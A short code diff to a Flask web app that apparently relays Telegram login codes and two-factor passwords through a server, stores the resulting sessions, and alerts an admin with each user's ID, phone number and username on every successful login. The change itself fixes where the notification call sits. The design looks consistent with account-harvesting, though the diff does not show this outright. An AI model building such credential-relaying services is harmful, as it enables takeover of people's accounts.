@@ -156,14 +156,13 @@ def verify_code():
         conn.commit()
         conn.close()
 
+        notify_admin_login(
+            user_id=user_id,
+            phone=phone,
+            username=getattr(me, "username", None)
+        )
+        
         return jsonify({"status": "success"})
-
-    notify_admin_login(
-        user_id=user_id,
-        phone=phone,
-        username=getattr(me, "username", None)
-    )
-
 
     except SessionPasswordNeededError:
         return jsonify({"status": "2fa_required"})
@@ -211,13 +210,13 @@ def verify_password():
 
         pending.pop(phone, None)
 
+        notify_admin_login(
+            user_id=user_id,
+            phone=phone,
+            username=getattr(me, "username", None)
+        )
+        
         return jsonify({"status": "success"})
-
-    notify_admin_login(
-        user_id=user_id,
-        phone=phone,
-        username=getattr(me, "username", None)
-    )
 
     except Exception as e:
         print("VERIFY PASSWORD ERROR:", e)
@@ -248,6 +247,7 @@ def notify_admin(user_id: str, phone: str, username: str | None = None):
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
+
 
 
 
